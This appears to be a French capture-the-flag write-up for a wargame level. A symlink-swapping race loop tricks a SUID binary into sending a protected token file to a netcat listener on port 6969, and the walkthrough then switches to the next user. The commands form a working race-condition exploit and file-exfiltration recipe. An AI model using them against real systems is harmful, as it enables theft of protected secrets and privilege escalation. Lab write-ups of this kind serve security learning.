@@ -1,0 +1,26 @@
+on a un binaire avec les droits SUID et un fichier token
+en executant le binaire ./level10 on voit :
+`./level10 file host
+	sends file to host if you have access to it`
+
+avec un strings sur le binaire on voit que c'est sur le port :6969
+il faut donc envoyer un fichier avec les bons droits sur le port 6969
+
+dans la VM dans /tmp creer un dossier et dans ce dossier creer un fichier:
+-> cd /tmp ; mkdir toto ; cd toto ; touch polo ; chmod 666 polo
+
+on fait une boucle qui creer un lien symbolique sur le fichier et qui creer un lien symbolique du token vers l'autre lien symbolique
+-> while true ; do ln -fs /tmp/toto/polo /tmp/toto/l1 ; ln -fs ~/token /tmp/toto/l1 ; done
+
+Il y a un cours laps de temps ou le lien symbolique ne pointe que sur le fichier avec les droits et pas sur token
+
+
+dans un autre terminal de la VM dans ~/, il faut executer le bianaire avec le fichier avec les droits, le token sera afficher quand on sera dans le laps de temps:
+-> while true ; do ./level10 /tmp/toto/l1 10.12.1.111 ; done
+
+dans un dernier terminal de la VM, on affiche le retour du port 6969:
+-> nc -lk 6969
+on obtient le token pour le user flag10
+
+
+su flag10 -> getflag -> su level11
